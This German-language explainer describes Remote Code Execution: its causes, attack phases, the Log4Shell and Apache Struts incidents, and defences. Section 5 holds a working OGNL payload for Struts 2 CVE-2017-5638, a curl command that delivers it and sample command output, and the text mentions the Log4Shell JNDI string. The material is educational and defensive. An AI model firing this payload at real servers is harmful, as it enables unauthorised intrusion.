# Remote Code Execution (RCE): Funktionsweise, Risiken und ein Praxisbeispiel

**Kernaussage:** Remote Code Execution gehört zu den kritischsten Schwachstellen, weil Angreifer darüber ohne Authentifizierung beliebigen Code auf einem Zielsystem ausführen und damit vollständige Kontrolle erlangen können – vom Datendiebstahl bis zur Installation von Ransomware

## 1 Begriff und Abgrenzung

Eine _Remote Code Execution_-Schwachstelle ermöglicht die Ausführung von Code, der **(a)** nicht vom Hersteller vorgesehen ist und **(b)** aus der Ferne initiiert wird. RCE ist damit ein Spezialfall der _Arbitrary Code Execution_ (ACE); im Gegensatz zu rein lokalen ACE-Fehlern erfolgt der Angriff hier über das NetzwerkVon einer reinen **Command Injection** unterscheidet sich RCE dadurch, dass der eingeschleuste Code meist innerhalb der Anwendungssandbox ausgeführt wird, nicht zwangsläufig als Betriebssystem-Befehl[

## 2 Technische Ursachen

RCE-Bugs entstehen, wenn eine Anwendung **nicht vertrauenswürdige Eingaben** verarbeitet und sie ungeprüft an gefährliche Interpreter-Funktionen weiterreicht oder Speichergrenzen verletzt. Typische Fehlerklassen sind in Tabelle 1 zusammengefasst.

|Fehlerklasse|Typisches Szenario|RCE-Bezug|
|---|---|---|
|Pufferüberlauf|Unsichere `strcpy`/`memcpy` überschreibt Rücksprungadresse|Angreifer lenkt Instruction Pointer auf Shell-Code[3](https://www.extrahop.com/resources/attacks/remote-code-execution)|
|Deserialisierung|Objekt‐Streams werden blind entpackt|„Gadget-Chain“ wird beim Entpacken ausgeführt[4](https://www.invicti.com/learn/remote-code-execution-rce/)[6](https://xygeni.io/de/sscs-glossary/what-is-rce-vulnerability-remote-code-execution-vulnerability/)|
|Eval/Interpreter|`eval()` erhält Benutzereingaben (z. B. PHP)|Fremdcode wird als Skript interpretiert[7](https://www.php.net/manual/en/function.eval.php)[8](https://www.rafaybaloch.com/2017/06/remote-code-execution-in-php-explained.html)|
|Unsichere Lookups|JNDI-Nachschlag in Log4j‐Log-Eintrag|Externer Code wird nachgeladen (Log4Shell)[9](https://www.ibm.com/think/topics/log4shell)[10](https://news.sophos.com/en-us/2021/12/17/inside-the-code-how-the-log4shell-exploit-works/)|

## 3 Ablauf eines RCE-Angriffs

Ein typischer Angriff gliedert sich in drei Phasen:

1. _Aufklärung_ – Port- und Schwachstellen-Scan, z. B. mit Nmap oder Shodan[11](https://www.rapid7.com/fundamentals/what-is-remote-code-execution-rce/).
    
2. _Exploitation_ – Crafting eines Payloads, das durch die Schwachstelle ausgeführt wird[12](https://www.crowdstrike.com/de-de/cybersecurity-101/cyberattacks/remote-code-execution/)[11](https://www.rapid7.com/fundamentals/what-is-remote-code-execution-rce/).
    
3. _Post-Exploitation_ – Rechteausweitung, Persistence, seitliche Bewegung im Netzwerk[11](https://www.rapid7.com/fundamentals/what-is-remote-code-execution-rce/).
    

![Ablauf eines Remote-Code-Execution-Angriffs](https://pplx-res.cloudinary.com/image/upload/v1752487415/dalle3_images/diuguxsg1qgdadiep1x2.png)

Ablauf eines Remote-Code-Execution-Angriffs [openai](https://openai.com/dall-e-3)

## 4 Bekannte Vorfälle

- **Log4Shell (CVE-2021-44228):** Durch Einbetten eines JNDI-Strings wie `${jndi:ldap://…}` in beliebige Log-Felder konnte fremder Bytecode nachgeladen und ausgeführt werden. Schweregrad CVSS 10 / „eine der gefährlichsten Schwachstellen des letzten Jahrzehnts“[9](https://www.ibm.com/think/topics/log4shell)[10](https://news.sophos.com/en-us/2021/12/17/inside-the-code-how-the-log4shell-exploit-works/)[13](https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/)[14](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-log4shell-log4j).
    
- **Apache Struts 2 (CVE-2017-5638):** Fehlerhafte Verarbeitung des HTTP-Headers `Content-Type` in der Jakarta-Multipart-Komponente erlaubte OGNL-Ausdrücke und führte zum Equifax-Databreach[15](https://threatprotect.qualys.com/2017/03/08/apache-struts-jakarta-multipart-parser-remote-code-execution-vulnerability/)[16](https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html)[17](https://www.trendmicro.com/en_us/research/17/c/cve-2017-5638-apache-struts-vulnerability-remote-code-execution.html)[18](https://www.f5.com/company/blog/nginx/modsecurity-apache-struts-cve-2017-5638).
    

## 5 Schritt-für-Schritt-Beispiel: Struts 2 CVE-2017-5638

Das folgende Szenario demonstriert einen RCE-Angriff in einem isolierten Testnetz. **Der Angriff darf ausschließlich in Laborumgebungen erfolgen.**

## 5.1 Voraussetzungen

- Verwundbare Web-App mit Struts 2 Version 2.5.10[19](https://github.com/ggolawski/struts-rce).
    
- Angreifer-Rechner mit _curl_.
    

## 5.2 Payload bauen

Die Schwachstelle wird über einen manipulierten `Content-Type`-Header ausgenutzt. Ein minimaler Payload, der den Befehl `id` ausführt, lautet[19](https://github.com/ggolawski/struts-rce):

text

`%{(#_='multipart/form-data').  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS). (#p=new java.lang.ProcessBuilder({'/bin/bash','-c','id'})). (#p.redirectErrorStream(true)).(#process=#p.start()). (@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}`

## 5.3 Exploit ausführen

text

`curl -isk -X POST \   -H "Content-Type: $PAYLOAD" \  http://zielserver/struts2/upload.action`

## 5.4 Ergebnis prüfen

Die Server-Antwort enthält die Ausgabe des Befehls, z. B.:

text

`uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)`

Damit ist nachgewiesen, dass beliebiger Code unter den Rechten des Applikations-Benutzers ausgeführt wird. Im nächsten Schritt könnte der Angreifer eine Reverse-Shell laden oder persistente Malware installieren[15](https://threatprotect.qualys.com/2017/03/08/apache-struts-jakarta-multipart-parser-remote-code-execution-vulnerability/)[20](https://www.briskinfosec.com/blogs/blogsdetail/Command-Execution-Attacks-on-Apache-Struts-server-CVE-2017-5638)[17](https://www.trendmicro.com/en_us/research/17/c/cve-2017-5638-apache-struts-vulnerability-remote-code-execution.html).

## 6 Schutzmaßnahmen

|Maßnahme|Wirkung|
|---|---|
|**Sicherer Coding-Standard** (Input-Validierung, keine `eval`, strikte Typen)|Eliminieren ganzer Fehlerklassen[21](https://www.mindtwo.de/lexicon/remote-code-execution-rce)[8](https://www.rafaybaloch.com/2017/06/remote-code-execution-in-php-explained.html)|
|**Patch-Management** & SBOM|Schnelles Schließen bekannter CVEs (z. B. Log4j ≥ 2.17.1)[9](https://www.ibm.com/think/topics/log4shell)|
|**Virtuelles Patching / WAF-Regeln**|Sofortiger Schutz durch Blocken charakteristischer Header bzw. Payloads (`#cmd=` in Struts)[18](https://www.f5.com/company/blog/nginx/modsecurity-apache-struts-cve-2017-5638)|
|**Least Privilege & Segmentation**|Begrenzen des Schadens bei erfolgreicher Ausführung[3](https://www.extrahop.com/resources/attacks/remote-code-execution)|
|**Penetration Tests & Red Team-Übungen**|Frühzeitiges Finden unbekannter RCE-Pfade[12](https://www.crowdstrike.com/de-de/cybersecurity-101/cyberattacks/remote-code-execution/)|

## 7 Fazit

Remote-Code-Execution-Schwachstellen erlauben **vollständige Systemkompromittierung bei minimalem Aufwand** und stehen regelmäßig an der Spitze der am häufigsten ausgenutzten CVEs[22](https://arcticwolf.com/resources/blog-de/das-anhaltende-risiko-der-remote-code-ausfuehrung/). Ein effektives Abwehrkonzept kombiniert **sicheres Entwicklungs-Lifecycle**, konsequentes **Patchen** sowie **technische Gegenmaßnahmen** wie WAF-Signaturen oder Runtime-Protection. Wer diese Ebenen lückenlos verknüpft, reduziert das RCE-Risiko erheblich – und damit die Gefahr von Datendiebstahl, Ransomware oder Krypto-Mining.